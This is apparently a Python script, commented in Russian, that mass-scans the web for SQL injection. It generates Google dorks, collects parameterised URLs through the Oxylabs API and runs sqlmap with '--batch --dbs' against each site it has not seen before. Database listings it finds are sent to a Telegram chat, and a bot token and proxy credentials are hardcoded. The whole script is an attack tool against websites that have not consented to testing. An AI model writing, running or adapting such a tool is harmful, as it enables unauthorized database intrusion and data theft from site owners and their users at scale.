import random
import argparse
import requests
import subprocess
import telebot
import os
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from urllib.parse import urlparse, parse_qs

# Telegram конфигурация
TELEGRAM_TOKEN = "8025308318:AAHmrfacGj-eO05vVwajnQYfts4gKqRaEgo"
CHAT_ID = "6519250395"
SCANNED_URLS_FILE = "scanned_urls.txt"
SCANNED_DORKS_FILE = "scanned_dorks.txt"

bot = telebot.TeleBot(TELEGRAM_TOKEN)

def send_to_telegram(message):
    try:
        bot.send_message(CHAT_ID, message)
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")

# Функция для загрузки данных из файла
def load_from_file(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            return {line.strip() for line in file.readlines() if line.strip()}
    except Exception as e:
        print(f"Ошибка при чтении файла {file_path}: {e}")
        return set()

# Сохранение отсканированного элемента
def save_to_file(file_path, item):
    try:
        with open(file_path, "a", encoding="utf-8") as file:
            file.write(f"{item}\n")
    except Exception as e:
        print(f"Ошибка сохранения в файл {file_path}: {e}")

# Фильтрация дорков, чтобы избегать повторного сканирования
def filter_new_dorks(dorks):
    scanned_dorks = load_from_file(SCANNED_DORKS_FILE)
    return [dork for dork in dorks if dork not in scanned_dorks]

# Генерация дорков
def generate_dorks(num_dorks, domain_file, part_file, param_file, output_file):
    domains = load_from_file(domain_file)
    parts = load_from_file(part_file)
    params = load_from_file(param_file)

    if not domains or not parts or not params:
        print("Ошибка: Один или несколько файлов пусты или отсутствуют данные.")
        return []

    generated_dorks = set()
    while len(generated_dorks) < num_dorks:
        domain = random.choice(list(domains))
        part = random.choice(list(parts))
        param = random.choice(list(params))
        dork = f"site:.{domain} inurl:.{part} inurl:{param}"
        generated_dorks.add(dork)

    try:
        with open(output_file, "w", encoding="utf-8") as file:
            file.write("\n".join(generated_dorks))
        print(f"{len(generated_dorks)} дорков сохранено в файл {output_file}")
    except Exception as e:
        print(f"Ошибка при сохранении файла {output_file}: {e}")
    return list(generated_dorks)

# Функция для извлечения корневого URL
def get_root_url(url):
    parsed_url = urlparse(url)
    return f"{parsed_url.scheme}://{parsed_url.netloc}"

# Функция для проверки, был ли корневой URL уже обработан
def is_root_url_processed(url, processed_urls):
    root_url = get_root_url(url)
    return root_url in processed_urls

# Функция для фильтрации URL, исключая уже обработанные корневые URL
def filter_urls(urls, processed_urls):
    filtered_urls = []
    for url in urls:
        # Если корневой URL ещё не был обработан, добавляем его в список для сканирования
        if not is_root_url_processed(url, processed_urls):
            filtered_urls.append(url)
            root_url = get_root_url(url)
            # Сохраняем корневой URL в файл отсканированных URL
            save_to_file(SCANNED_URLS_FILE, root_url)
    return filtered_urls

# Загрузка URL через дорки
def fetch_urls(dork, auth, limit=100):
    payload = {
        'source': 'google_search',
        'query': dork,
        'limit': str(limit),
        'pages': '1',
        'start_page': '1',
        'parse': True,
        'user_agent_type': 'desktop',
        'context': [{'key': 'filter', 'value': 1}, {'key': 'nfpr', 'value': True}]
    }
    try:
        response = requests.post(
            'https://realtime.oxylabs.io/v1/queries',
            auth=auth,
            json=payload,
            timeout=200
        )
        response.raise_for_status()
        data = response.json()
    except Exception as e:
        print(f"Ошибка загрузки URL для дорка '{dork}': {e}")
        return set()

    urls = set()
    if "results" in data:
        for result in data["results"]:
            content = result.get('content', {})
            if isinstance(content, dict):
                organic_results = content.get('results', {}).get('organic', [])
                for org in organic_results:
                    url = org.get('url')
                    if url and url.startswith('https') and '=' in url:
                        urls.add(url)

    print(f"Processed dork: {dork}, found {len(urls)} URLs")
    return urls

# SQLmap сканирование
def run_sqlmap(url):
    try:
        print(f"Сканирую: {url}")
        result = subprocess.run(
            ["sqlmap", "-u", url, "--batch", "--random-agent", "--threads=10", "--dbs"],
            capture_output=True, text=True
        )
        output = result.stdout
        if "available databases" in output:
            with open("results.txt", "a", encoding="utf-8") as file:
                file.write(f"Результаты для {url}:\n{output}\n{'='*50}\n")
            send_to_telegram(f"Найдены базы данных для {url}:\n{output[:3000]}")
            save_to_file(SCANNED_URLS_FILE, url)
        else:
            print(f"Нет уязвимостей на {url}")
    except Exception as e:
        send_to_telegram(f"Ошибка при сканировании {url}: {str(e)}")

# Основная функция
def main():
    parser = argparse.ArgumentParser(description="Генерация дорков, сбор URL и их сканирование.")
    parser.add_argument("-n", "--num", type=int, default=150, help="Количество генерируемых дорков.")
    parser.add_argument("-o", "--output", type=str, default="generated_dorks.txt", help="Файл для сохранения дорков.")
    parser.add_argument("--domains", type=str, default="domains.txt", help="Файл с доменами.")
    parser.add_argument("--parts", type=str, default="parts.txt", help="Файл с частями URL.")
    parser.add_argument("--params", type=str, default="params.txt", help="Файл с параметрами.")
    args = parser.parse_args()

    auth = ('Stark_QWwpf', 'StarkPass03Q+')
    dorks = generate_dorks(args.num, args.domains, args.parts, args.params, args.output)

    if not dorks:
        send_to_telegram("Ошибка: Дорки не были сгенерированы.")
        return

    scanned_urls = load_from_file(SCANNED_URLS_FILE)
    new_dorks = filter_new_dorks(dorks)
    if not new_dorks:
        send_to_telegram("Все дорки уже были отсканированы.")
        return

    all_urls = set()
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(fetch_urls, dork, auth): dork for dork in new_dorks}
        for future in futures:
            try:
                urls = future.result()
                all_urls.update(urls)
            except Exception as e:
                print(f"Ошибка обработки дорка: {e}")

    urls_to_scan = filter_urls(all_urls, scanned_urls)

    with ThreadPoolExecutor(max_workers=15) as executor:
        list(tqdm(executor.map(run_sqlmap, urls_to_scan), total=len(urls_to_scan), desc="Сканирование сайтов"))

    send_to_telegram("Сканирование завершено. Проверьте results.txt для деталей.")

if __name__ == '__main__':
    main()

